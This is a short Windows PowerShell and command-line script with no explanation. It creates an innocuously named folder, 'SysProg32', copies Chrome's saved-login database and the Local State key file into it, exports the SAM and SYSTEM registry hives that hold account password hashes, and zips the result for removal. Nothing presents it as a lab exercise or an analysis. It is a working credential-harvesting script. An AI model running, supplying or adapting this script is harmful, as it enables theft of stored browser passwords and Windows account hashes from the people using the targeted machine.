# Create folder
New-Item -ItemType Directory -Path "C:\SysProg32" -Force

# Copy Chrome files (Chrome must be closed)
Copy-Item -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" -Destination "C:\SysProg32" -Force
Copy-Item -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State" -Destination "C:\SysProg32" -Force

# Export registry hives (requires Admin)
reg save HKLM\SAM "C:\SysProg32\sam.save" /y
reg save HKLM\SYSTEM "C:\SysProg32\system.save" /y

Compress-Archive -Path "C:\SysProg32" -DestinationPath "C:\SysProg32.zip" -Force
